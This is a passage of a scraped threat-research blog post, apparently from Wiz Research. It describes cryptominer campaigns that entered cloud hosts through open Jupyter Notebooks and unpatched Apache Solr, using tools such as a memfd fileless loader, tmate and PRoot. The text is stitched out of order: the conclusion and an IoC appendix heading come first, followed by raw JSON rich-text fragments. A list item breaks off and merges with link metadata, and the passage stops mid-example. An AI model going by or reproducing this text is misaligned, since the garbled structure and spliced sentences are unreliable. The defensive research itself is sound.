exploiting old vulnerabilities. In this blog post, we’ve detailed seven different attack incidents we observed over the summer. Each incident employed a distinct set of techniques and tools; nevertheless, all these attacks were executed with the aim of deploying cryptominers. </p><p class="">These incidents should serve as a prompt for organizations to acquire a security-posture solution, which helps security teams mitigate toxic-risk combinations and reduce attack surfaces that might otherwise be abused by threat actors. This should be coupled with a runtime protection mechanism that can swiftly identify and address security breaches before they become impactful. </p><p class="">Please feel free to reach out to <a rel="noreferrer noopener" target="_blank" href="mailto:threat.hunters@wiz.io"><u>threat.hunters@wiz.io</u></a> if you’ve been impacted by this activity or wish to exchange further information and IoCs that might assist in ongoing analysis.</p><p class=""></p><p class=""><em>This blog post was written by Wiz Research, as part of our ongoing mission to analyze threats to the cloud, build mechanisms that prevent and detect them, and fortify cloud security strategies.</em> </p><h2><div class=""></div><a id="appendix-iocs-93" class="relative -top-20"></a>Appendix: IoCs</h2><h3><div the summer of 2023, Wiz Research detected several different cryptomining incidents targeting cloud workloads. Combining "},{"url":"https://www.wiz.io/lp/wiz-runtime-sensor","type":"link","children":[{"type":"span","value":"Wiz Runtime Sensor"}]},{"type":"span","value":" events and information from Wiz agentless scanning, we were able to pinpoint security flaws that led to the attackers’ initial access, assess the scope of the compromised resources, and analyze the attackers’ activities."}]},{"type":"paragraph","children":[{"type":"span","value":"Cryptomining stands out as a common threat to cloud workloads since it takes advantage of paid computing resources and yields direct monetary gains for the attackers. The threat actors behind these activities are mostly interested in making quick profits, aiming to spread their opportunistic mining operations as far and as wide as possible. Typically, these attacks aren't very complex or stealthy. The attackers usually look for easy ways to get in, such as weak SSH passwords, known configuration mistakes, widespread simple exploits, and other low-hanging fruit."}]},{"type":"paragraph","children":[{"type":"span","value":"This is understandably a cause for concern for our customers since it can potentially lead to financial losses. Furthermore, it indicates the presence of security flaws that could lead to higher-impact attacks. "}]},{"type":"paragraph","children":[{"type":"span","value":"In this blog post, we cover seven incidents of cryptomining activities. The first few campaigns utilized open Jupyter Notebooks as an initial access vector, while the rest exploited unpatched Apache Solr v8.1.1. Each campaign used different tooling, which we’ll discuss in detail. "}]},{"type":"paragraph","children":[{"type":"span","value":"Our main observations from the various campaigns we investigated are as follows:  "}]},{"type":"list","style":"bulleted","children":[{"type":"listItem","children":[{"type":"paragraph","children":[{"type":"span","value":"Threat actors used three different open-source "},{"url":"https://github.com/fireice-uk/xmr-stak","meta":[{"id":"rel","value":"noreferrer Pastebin to host their tools and configuration files."}]}]}]},{"type":"paragraph","children":[{"type":"span","value":"The table below summarizes the different incidents: "}]},{"item":"196366885","type":"block"},{"type":"paragraph","children":[{"type":"span","value":"To learn more about the incidents and their attack flow, read the following sections. All IoCs are listed in the Appendix at the end of this post.  "}]},{"type":"heading","level":2,"children":[{"type":"span","value":"Initial access vector: open Jupyter Notebook "}]},{"type":"paragraph","children":[{"type":"span","value":"Jupyter Notebook is a common computing platform, which is sometimes misconfigured to allow remote unauthenticated access, effectively enabling remote code execution on the host machine. "}]},{"type":"heading","level":3,"children":[{"type":"span","value":"Incident #1 – Pyloose "}]},{"type":"paragraph","children":[{"type":"span","value":"Pyloose is a fileless XMRig attack delivered via a Python loader. The loader uses "},{"url":"https://man7.org/linux/man-pages/man2/memfd_create.2.html","meta":[{"id":"rel","value":"noreferrer noopener"},{"id":"target","value":"_blank"}],"type":"link","children":[{"type":"span","marks":["underline"],"value":"memfd"}]},{"type":"span","value":", a known Linux fileless technique, and is generated using the "},{"url":"https://github.com/nnsee/fileless-elf-exec","meta":[{"id":"rel","value":"noreferrer noopener"},{"id":"target","value":"_blank"}],"type":"link","children":[{"type":"span","marks":["underline"],"value":"fileless-elf-exec"}]},{"type":"span","value":" open-source tool. Read more about PyLoose in our blog post published last July, "},{"url":"https://www.wiz.io/blog/pyloose-first-python-based-fileless-attack-on-cloud-workloads","meta":[{"id":"rel","value":"noreferrer noopener"},{"id":"target","value":"_blank"}],"type":"link","children":[{"type":"span","marks":["underline"],"value":"PyLoose in PyLoose: Python-based fileless malware targets cloud workloads to deliver cryptominer."}]},{"type":"span","value":" "}]},{"type":"heading","level":3,"children":[{"type":"span","value":"Incident #2 – newhello "}]},{"type":"paragraph","children":[{"type":"span","value":"This attack included a renamed XMRig miner hosted on a GitHub repository. The miner was renamed “newhello” and was executed with the use of "},{"url":"https://tmate.io/","meta":[{"id":"rel","value":"noreferrer noopener"},{"id":"target","value":"_blank"}],"type":"link","children":[{"type":"span","marks":["underline"],"value":"tmate"}]},{"type":"span","value":" and "},{"url":"https://proot-me.github.io/","meta":[{"id":"rel","value":"noreferrer noopener"},{"id":"target","value":"_blank"}],"type":"link","children":[{"type":"span","marks":["underline"],"value":"PRoot"}]},{"type":"span","value":" tools.  "}]},{"type":"paragraph","children":[{"type":"span","value":"Before we delve into the attack flow, let’s understand what tmate and PRoot are and how they can be abused by attackers: "}]},{"type":"paragraph","children":[{"type":"span","marks":["strong"],"value":"tmate – "},{"type":"span","value":"tmate is a service that provides terminal-sharing and remote-collaboration capabilities. It allows developers to share their command-line terminal sessions with others in real time, enabling collaborative debugging, troubleshooting, and programming. tmate is often abused by attackers to conduct reverse-SSH tunneling ["},{"url":"https://attack.mitre.org/techniques/T1048/","meta":[{"id":"rel","value":"noreferrer noopener"},{"id":"target","value":"_blank"}],"type":"link","children":[{"type":"span","marks":["underline"],"value":"T1048"}]},{"type":"span","value":"] ["},{"url":"https://attack.mitre.org/techniques/T1219/","meta":[{"id":"rel","value":"noreferrer noopener"},{"id":"target","value":"_blank"}],"type":"link","children":[{"type":"span","marks":["underline"],"value":"T1219"}]},{"type":"span","value":"] to a compromised resource. However, in this incident, tmate was used to keep the shell session alive and maximize the execution time of the miner.  "}]},{"type":"paragraph","children":[{"type":"span","marks":["strong"],"value":"PRoot – "},{"type":"span","value":"PRoot is a user-space implementation of the chroot mechanism in Linux. chroot is a UNIX-like operating system feature that allows a process and its descendants to see a modified root directory structure, effectively isolating them from the rest of the filesystem. This can be used for various purposes, such as testing, debugging, or running potentially unsafe software in a controlled environment."}]},{"type":"paragraph","children":[{"type":"span","value":"PRoot extends this concept by providing a way to run a program with an altered root directory without requiring superuser privileges. Unlike traditional chroot, which requires administrative access, PRoot can be used by regular users to create isolated environments. "}]},{"type":"paragraph","children":[{"type":"span","value":"PRoot achieves this by intercepting system calls made by the program and redirecting them to the appropriate locations within the modified root directory. This way, the program believes it's running in a different environment than the actual host system. PRoot can be particularly useful for tasks like testing software builds, running old or incompatible programs, and performing system-recovery tasks without affecting the main system."}]},{"type":"paragraph","children":[{"type":"span","value":"Threat actors abuse PRoot for two main reasons:  "}]},{"type":"paragraph","children":[{"type":"span","value":"1. By dropping PRoot together with an archived filesystem on the compromised resource, attackers can prepare their entire toolset inside the dropped filesystem without relying on the existing tools and exact architecture of the compromised resource (the bring-your-own-filesystem method). "}]},{"type":"paragraph","children":[{"type":"span","value":"2. Because PRoot uses process injection and emulation methods, attackers can utilize PRoot to bypass security measures ["},{"url":"https://attack.mitre.org/tactics/TA0005/","meta":[{"id":"rel","value":"noreferrer noopener"},{"id":"target","value":"_blank"}],"type":"link","children":[{"type":"span","marks":["underline"],"value":"TA0005"}]},{"type":"span","value":"] and detections that rely on specific system calls."}]},{"type":"paragraph","children":[{"type":"span","value":"Below is an example of executing "},{"type":"span","marks":["code"],"value":"which nc"},{"type":"span","value":" before and after switching to a different isolated filesystem environment with PRoot.
